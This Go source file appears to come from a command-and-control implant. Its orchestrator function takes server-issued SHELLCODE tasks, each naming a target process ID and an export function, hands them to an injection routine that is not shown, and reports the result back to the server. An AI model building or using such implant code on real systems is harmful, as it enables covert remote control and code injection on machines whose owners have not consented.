package agent

import (
	"encoding/json"
	"fmt"
	"log"
	"numinon_shadow/internal/agent/command/shellcode"
	"numinon_shadow/internal/models"
	"strings"
)

// orchestrateShellcode is the orchestrator for the SHELLCODE command.
func (a *Agent) orchestrateShellcode(task models.ServerTaskResponse) models.AgentTaskResult {

	// Create an instance of the command-specific args struct
	var args models.ShellcodeArgs

	// ServerTaskResponse.data contains the command-specific args, so now we unmarshall the field into the struct
	if err := json.Unmarshal(task.Data, &args); err != nil {
		errMsg := fmt.Sprintf("Failed to unmarshal ShellcodeArgs for Task ID %s: %v. Raw Data: %s", task.TaskID, err, string(task.Data))
		log.Printf("|❗ERR SHELLCODE ORCHESTRATOR| %s", errMsg)
		return models.AgentTaskResult{
			TaskID: task.TaskID,
			Status: models.StatusFailureUnmarshallError,
			Error:  errMsg,
		}
	}

	log.Printf("|✅ SHELLCODE ORCHESTRATOR| Task ID: %s. Executing Shellcode, Target PID: %d, Export Function: %s",
		task.TaskID, args.TargetPID, args.ExportName)

	// Call the "doer" function
	commandShellcode := shellcode.New()                        // create os-specific Download struct ("decided" when compiled)
	shellcodeResult, err := commandShellcode.DoShellcode(args) // Call the interface method

	// Prepare the final TaskResult
	finalResult := models.AgentTaskResult{
		TaskID: task.TaskID,
		Output: nil,
		Error:  "",
	}

	if err != nil {
		finalResult.Error = err.Error()

		log.Printf("|❗ERR SHELLCODE ORCHESTRATOR| Shellcode execution failed for Task ID %s: %s.",
			task.TaskID, finalResult.Error)

		// NOTE THIS NEEDS TO BE FIXED AND ADAPTED ONCE ACTUAL COMMAND HAS BEEN IMPLEMENTED IN DOER
		errorString := finalResult.Error
		switch {
		case strings.Contains(errorString, "validation:"):
			finalResult.Status = models.StatusFailureInvalidArgs
		case strings.Contains(errorString, "File not found"):
			finalResult.Status = models.StatusFailureFileNotFound
		case strings.Contains(errorString, "Permission denied"):
			finalResult.Status = models.StatusFailurePermissionDenied
		default:
			finalResult.Status = models.StatusFailureReadError
		}
	} else {
		// If we get here it means our doer call succeeded

		finalResult.Output = shellcodeResult.Output

		finalResult.Status = models.StatusSuccess
		log.Printf("|✅ SHELLCODE ORCHESTRATOR| Execution successful for Task ID %s. Sending %d base64 encoded bytes.",
			task.TaskID, len(finalResult.Output))
	}
	return finalResult
}
